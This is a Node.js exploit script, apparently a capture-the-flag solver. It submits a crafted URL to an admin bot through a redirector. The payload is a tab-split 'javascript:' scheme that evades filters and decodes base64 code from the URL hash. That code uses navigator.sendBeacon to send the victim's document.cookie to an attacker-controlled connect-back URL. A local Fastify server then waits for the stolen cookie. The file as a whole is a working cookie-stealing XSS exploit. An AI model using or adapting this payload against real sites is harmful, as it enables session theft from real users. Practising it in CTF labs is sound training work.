import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const url = new URL("http://redirector:3000");
url.searchParams.set(
  "next",
  `javascrip\tt:with(navigation)with(currentEntry)with(url)setTimeout(atob(slice(___)))`
);
const hashIndex = url.href.length + 1;
url.searchParams.set(
  "next",
  url.searchParams
    .get("next")
    .replace("___", hashIndex.toString().padStart(3, " "))
);
url.hash = btoa(`navigator.sendBeacon("${CONNECTBACK_URL}", document.cookie);`);

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await reportUrl(url);

  await sleep(3_000);
  assert.fail("Failed");
});
